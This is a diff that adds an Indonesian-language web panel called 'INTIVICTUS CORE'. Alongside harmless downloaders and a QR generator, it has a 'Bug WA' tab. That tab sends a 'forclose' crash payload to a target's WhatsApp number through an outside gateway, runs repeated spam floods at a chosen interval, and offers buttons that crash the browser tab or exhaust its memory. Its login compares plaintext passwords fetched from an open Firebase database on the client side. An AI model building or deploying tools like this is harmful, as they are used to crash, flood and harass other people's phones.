@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INTIVICTUS CORE</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+        body { background:#0a0f1e; color:#fff; padding:20px; }
+        #loginOverlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); display:flex; justify-content:center; align-items:center; z-index:2000; }
+        .login-container { background:#0f1622; border-radius:48px; padding:40px 30px; width:380px; text-align:center; }
+        .login-container img { width:200px; margin-bottom:20px; }
+        .login-container input { width:100%; padding:14px; margin:12px 0; background:#1e2a3a; border:none; border-radius:60px; color:white; }
+        .login-container button { width:100%; background:#00a6ff; border:none; padding:14px; border-radius:60px; font-weight:bold; cursor:pointer; }
+        #mainApp { display:none; max-width:1200px; margin:0 auto; }
+        .tab-nav { display:flex; flex-wrap:wrap; gap:10px; background:#0b111e; padding:12px 20px; border-radius:80px; margin-bottom:30px; justify-content:center; }
+        .tab-btn { background:#1a2538; border:none; padding:10px 22px; border-radius:40px; color:#bdd4ff; cursor:pointer; }
+        .tab-btn.active { background:#00a6ff; color:#0a0f1e; }
+        .tab-content { background:#0f1622; border-radius:32px; padding:28px; }
+        .tab-pane { display:none; }
+        .tab-pane.active { display:block; }
+        .widget { background:#111a28; border-radius:28px; padding:22px; margin-bottom:24px; }
+        input, textarea { background:#1e2d3f; border:1px solid #3a5a7a; padding:12px; border-radius:32px; color:white; width:100%; margin:8px 0; }
+        button { background:#00a6ff; border:none; padding:10px 24px; border-radius:40px; cursor:pointer; margin-top:6px; }
+        .danger-btn { background:#ff4444; }
+        .warning-btn { background:#ffaa00; color:#000; }
+        footer { text-align:center; margin-top:35px; font-size:12px; opacity:0.7; }
+        .intro-video { width:100%; max-width:800px; margin:20px auto; display:none; }
+    </style>
+</head>
+<body>
+<div id="loginOverlay">
+    <div class="login-container">
+        <img src="https://i.ibb.co/your-image/intivictus-logo.png" alt="INTIVICTUS" onerror="this.src='https://via.placeholder.com/200x80?text=INTIVICTUS'">
+        <h1>INTIVICTUS CORE</h1>
+        <input type="text" id="loginUser" placeholder="Username">
+        <input type="password" id="loginPass" placeholder="Password">
+        <button id="loginBtn">ACTIVATE</button>
+        <div id="loginMsg" style="color:red; margin-top:12px;"></div>
+        <div style="margin-top:18px; font-size:12px;">Daftar via Telegram: /register user pass role<br>Pairing WA: /pair</div>
+    </div>
+</div>
+<div id="mainApp">
+    <div class="tab-nav">
+        <button class="tab-btn" data-tab="dashboard">Dashboard</button>
+        <button class="tab-btn" data-tab="image">Image</button>
+        <button class="tab-btn" data-tab="music">Music</button>
+        <button class="tab-btn" data-tab="senders">My Senders</button>
+        <button class="tab-btn" data-tab="profil">Profil</button>
+        <button class="tab-btn" data-tab="qr">QR</button>
+        <button class="tab-btn" data-tab="tiktok">TikTok</button>
+        <button class="tab-btn" data-tab="youtube">YouTube</button>
+        <button class="tab-btn" data-tab="bug">Bug WA</button>
+    </div>
+    <div class="tab-content">
+        <div id="dashboard" class="tab-pane"><div class="widget"><h2>Dashboard</h2><p>Selamat datang, <strong id="displayUser">-</strong> <span id="roleBadge"></span></p><p>Status WA: <span id="waStatus">Mengecek...</span></p><button id="logoutBtn">Logout</button></div></div>
+        <div id="image" class="tab-pane"><div class="widget"><h2>Image Upload</h2><input type="file" id="imageFile" accept="image/*"><img id="preview" style="max-width:100%; margin-top:10px; display:none;"></div></div>
+        <div id="music" class="tab-pane"><div class="widget"><h2>Music Player</h2><iframe style="width:100%; height:200px;" src="https://open.spotify.com/embed/playlist/37i9dQZF1DXcBWIGoYBM5M" frameborder="0"></iframe></div></div>
+        <div id="senders" class="tab-pane"><div class="widget"><h2>My Senders</h2><ul id="senderList"><li>@YudzxTechh <button class="sendMsgBtn" data-contact="@YudzxTechh">Pesan</button></li><li>Ranz <button class="sendMsgBtn" data-contact="Ranz">Pesan</button></li></ul><input type="text" id="newSender" placeholder="Nama baru"><button id="addSender">Tambah</button><div id="senderNotif"></div></div></div>
+        <div id="profil" class="tab-pane"><div class="widget"><h2>Profil</h2><p>Username: <span id="profilUser">-</span></p><p>Role: <span id="profilRole">-</span></p></div></div>
+        <div id="qr" class="tab-pane"><div class="widget"><h2>QR Generator</h2><input type="text" id="qrText" value="https://t.me/YudzxTechh"><button id="genQR">Generate</button><div id="qrContainer"></div></div></div>
+        <div id="tiktok" class="tab-pane"><div class="widget"><h2>TikTok Downloader</h2><input type="text" id="ttUrl"><button id="ttDownload">Download</button><div id="ttResult"></div></div></div>
+        <div id="youtube" class="tab-pane"><div class="widget"><h2>YouTube Downloader</h2><input type="text" id="ytUrl"><button id="ytDownload">Download</button><div id="ytResult"></div></div></div>
+        <div id="bug" class="tab-pane"><div class="widget"><h3>Kirim Pesan WhatsApp</h3><input type="text" id="targetNumber" placeholder="628xxxx"><textarea id="bugMessage" rows="3" placeholder="Pesan / payload forclose"></textarea><button id="sendBugBtn">Kirim</button><div id="bugResult"></div><hr><h3>Forclose Payload</h3><textarea id="forclosePayload" rows="2" readonly>%00%00%00%n%n%n%n%n%nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</textarea><button id="copyForclose">Copy</button><button id="sendForcloseWA" class="warning-btn">Kirim Payload</button><input type="text" id="forcloseTarget" placeholder="Nomor target"><hr><h3>Delay Spam</h3><input type="text" id="delayTarget" placeholder="Nomor target"><textarea id="delayMessage" rows="2" placeholder="Pesan spam"></textarea><input type="number" id="delaySeconds" placeholder="Detik" value="5"><input type="number" id="delayCount" placeholder="Jumlah" value="10"><button id="startDelay" class="warning-btn">Mulai</button><button id="stopDelay">Stop</button><div id="delayStatus"></div><hr><h3>Crash UI</h3><button id="crashTab" class="danger-btn">Crash Tab</button><button id="crashMemory" class="danger-btn">Memory Leak</button></div></div>
+    </div>
+    <footer>INTIVICTUS CORE | WA Gateway: node.yoshi.piihosting.my.id:3000</footer>
+</div>
+
+<script>
+const WA_GATEWAY = 'http://node.yoshi.piihosting.my.id:3000';
+const FIREBASE_URL = 'https://databseakun-default-rtdb.asia-southeast1.firebasedatabase.app/';
+let currentUser = null, delayInterval = null;
+
+async function sendWA(to, msg) {
+    try {
+        const res = await fetch(`${WA_GATEWAY}/send-wa`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ to, message: msg })
+        });
+        return await res.json();
+    } catch(e) { return { success: false, error: e.message }; }
+}
+
+document.getElementById('loginBtn').onclick = async () => {
+    const user = document.getElementById('loginUser').value.trim();
+    const pass = document.getElementById('loginPass').value.trim();
+    if (!user || !pass) return document.getElementById('loginMsg').innerText = 'Isi semua';
+    const res = await fetch(`${FIREBASE_URL}users/${user}.json`);
+    const data = await res.json();
+    if (data && data.password === pass) {
+        currentUser = user;
+        localStorage.setItem('intivictus_user', user);
+        document.getElementById('displayUser').innerText = user;
+        document.getElementById('profilUser').innerText = user;
+        document.getElementById('profilRole').innerText = data.role;
+        document.getElementById('roleBadge').innerText = data.role;
+        document.getElementById('loginOverlay').style.display = 'none';
+        document.getElementById('mainApp').style.display = 'block';
+        showTab('dashboard');
+        // Intro video (YouTube embed) setelah login
+        const introDiv = document.createElement('div');
+        introDiv.id = 'introVideoModal';
+        introDiv.style.position = 'fixed'; introDiv.style.top = '0'; introDiv.style.left = '0'; introDiv.style.width = '100%'; introDiv.style.height = '100%'; introDiv.style.background = 'rgba(0,0,0,0.95)'; introDiv.style.zIndex = '3000'; introDiv.style.display = 'flex'; introDiv.style.justifyContent = 'center'; introDiv.style.alignItems = 'center'; introDiv.style.flexDirection = 'column';
+        introDiv.innerHTML = `<div style="background:#000; border-radius:20px; width:80%; max-width:800px;"><iframe width="100%" height="400" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div><button id="skipIntroBtn" style="margin-top:20px; background:#ff4444; color:white; padding:10px 20px; border-radius:40px; border:none; cursor:pointer;">SKIP INTRO</button>`;
+        document.body.appendChild(introDiv);
+        document.getElementById('skipIntroBtn').onclick = () => introDiv.remove();
+    } else {
+        document.getElementById('loginMsg').innerText = 'Username atau password salah';
+    }
+};
+if (localStorage.getItem('intivictus_user')) document.getElementById('loginUser').value = localStorage.getItem('intivictus_user');
+document.getElementById('logoutBtn').onclick = () => { localStorage.clear(); location.reload(); };
+function showTab(tabId) {
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`.tab-btn[data-tab="${tabId}"]`).classList.add('active');
+}
+document.querySelectorAll('.tab-btn').forEach(btn => btn.onclick = () => showTab(btn.getAttribute('data-tab')));
+document.getElementById('imageFile').onchange = (e) => {
+    const file = e.target.files[0];
+    if (file) { const reader = new FileReader(); reader.onload = ev => { document.getElementById('preview').src = ev.target.result; document.getElementById('preview').style.display = 'block'; }; reader.readAsDataURL(file); }
+};
+function attachSenderEvents() {
+    document.querySelectorAll('.sendMsgBtn').forEach(btn => btn.onclick = () => { document.getElementById('senderNotif').innerHTML = `Pesan ke ${btn.getAttribute('data-contact')} (simulasi)`; setTimeout(() => document.getElementById('senderNotif').innerHTML = '', 2000); });
+}
+document.getElementById('addSender').onclick = () => {
+    const newName = document.getElementById('newSender').value.trim();
+    if (newName) { const li = document.createElement('li'); li.innerHTML = `${newName} <button class="sendMsgBtn" data-contact="${newName}">Pesan</button>`; document.getElementById('senderList').appendChild(li); attachSenderEvents(); document.getElementById('newSender').value = ''; }
+};
+attachSenderEvents();
+document.getElementById('genQR').onclick = () => { const text = document.getElementById('qrText').value; const container = document.getElementById('qrContainer'); container.innerHTML = ''; if (text) new QRCode(container, { text: text, width: 200, height: 200 }); };
+document.getElementById('ttDownload').onclick = async () => { const url = document.getElementById('ttUrl').value; const div = document.getElementById('ttResult'); if (!url) return; div.innerHTML = 'Mengambil...'; try { const r = await fetch(`https://tikdown.org/api/ajaxSearch?q=${encodeURIComponent(url)}`); const d = await r.json(); if (d.video) div.innerHTML = `<a href="${d.video}" target="_blank">Download</a>`; else div.innerHTML = 'Gagal'; } catch(e) { div.innerHTML = 'Error'; } };
+document.getElementById('ytDownload').onclick = async () => { const url = document.getElementById('ytUrl').value; const div = document.getElementById('ytResult'); if (!url) return; div.innerHTML = 'Memproses...'; try { const proxy = `https://api.vevioz.com/api/button/mp3/${encodeURIComponent(url)}`; const resp = await fetch(proxy); const html = await resp.text(); const match = html.match(/href="([^"]+\.mp3)"/); if (match) div.innerHTML = `<a href="${match[1]}" target="_blank">MP3</a>`; else div.innerHTML = 'Gagal'; } catch(e) { div.innerHTML = 'Error'; } };
+document.getElementById('sendBugBtn').onclick = async () => { let to = document.getElementById('targetNumber').value.trim(); const msg = document.getElementById('bugMessage').value.trim(); if (!to || !msg) return document.getElementById('bugResult').innerHTML = 'Isi semua'; if (!to.startsWith('62')) to = '62' + to.replace(/^0+/, ''); const res = await sendWA(to, msg); document.getElementById('bugResult').innerHTML = res.success ? '✅ Terkirim' : '❌ ' + res.error; };
+document.getElementById('copyForclose').onclick = () => { navigator.clipboard.writeText(document.getElementById('forclosePayload').value); alert('Copied'); };
+document.getElementById('sendForcloseWA').onclick = async () => { let to = document.getElementById('forcloseTarget').value.trim(); if (!to) return; if (!to.startsWith('62')) to = '62' + to.replace(/^0+/, ''); const payload = document.getElementById('forclosePayload').value; const res = await sendWA(to, payload); alert(res.success ? 'Payload terkirim' : 'Gagal: ' + res.error); };
+document.getElementById('startDelay').onclick = () => { if (delayInterval) clearInterval(delayInterval); let to = document.getElementById('delayTarget').value.trim(); const msg = document.getElementById('delayMessage').value.trim(); const delay = parseInt(document.getElementById('delaySeconds').value)*1000; const count = parseInt(document.getElementById('delayCount').value); if (!to || !msg) return; if (!to.startsWith('62')) to = '62' + to.replace(/^0+/, ''); let i = 0; const send = async () => { if (i >= count) { clearInterval(delayInterval); document.getElementById('delayStatus').innerHTML = 'Selesai'; return; } i++; document.getElementById('delayStatus').innerHTML = `Mengirim ${i}/${count}...`; await sendWA(to, `${msg} [${i}]`); }; send(); delayInterval = setInterval(send, delay); document.getElementById('delayStatus').innerHTML = `Dimulai, setiap ${delay/1000} detik.`; };
+document.getElementById('stopDelay').onclick = () => { if (delayInterval) clearInterval(delayInterval); document.getElementById('delayStatus').innerHTML = 'Dihentikan'; };
+document.getElementById('crashTab').onclick = () => { setInterval(() => location.reload(), 50); };
+document.getElementById('crashMemory').onclick = () => { let a = []; setInterval(() => a.push(new Array(1000000).fill('x')), 50); alert('Memory leak started'); };
+setTimeout(() => { if(document.getElementById('qrText').value) document.getElementById('genQR').click(); }, 500);
+</script>
+</body>
+</html>
